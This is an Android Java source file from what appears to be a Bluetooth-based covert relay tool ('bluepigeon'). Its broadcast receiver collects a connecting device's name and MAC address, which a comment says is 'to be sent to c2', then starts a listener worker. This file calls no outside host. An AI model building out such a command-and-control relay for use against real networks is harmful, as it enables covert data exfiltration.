package com.csg.bluepigeon.pigeon;

import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import androidx.work.Data;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.csg.bluepigeon.ui.MainActivity;
import com.csg.bluepigeon.util.BlueChirp;
import com.csg.bluepigeon.util.Config;

public class BluetoothDownloadReceiver extends BroadcastReceiver {
    final String TAG = "BluetoothDownloadReceiver ";
    private BlueChirp blueChirp = new BlueChirp(Config.LOGGING_DIR_PATH);

    @Override
    public void onReceive(Context context, Intent intent) {

        // Extract metadata from bluedispatcher and bluepigeon to be sent to c2
        BluetoothDevice bluetoothDevice = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
        String blueDispAddress = bluetoothDevice.getAddress();
        String blueDispName = bluetoothDevice.getName();
        String bluePigName = BluetoothAdapter.getDefaultAdapter().getName();

        // Put into Data
        Data bpData = new Data.Builder()
                .putString("blueDispAddress", blueDispAddress)
                .putString("blueDispName", blueDispName)
                .putString("bluePigName", bluePigName)
                .build();

        // start blue pigeon listener
        blueChirp.log(TAG + "onReceive: deploying blue pigeon to deliver message from device name: " + blueDispName + ", mac address: " + blueDispAddress, "info");

        WorkManager workManager = WorkManager.getInstance(context);
        workManager.enqueue(new OneTimeWorkRequest.Builder(BluePigeonListener.class).setInputData(bpData).build());
    }
}
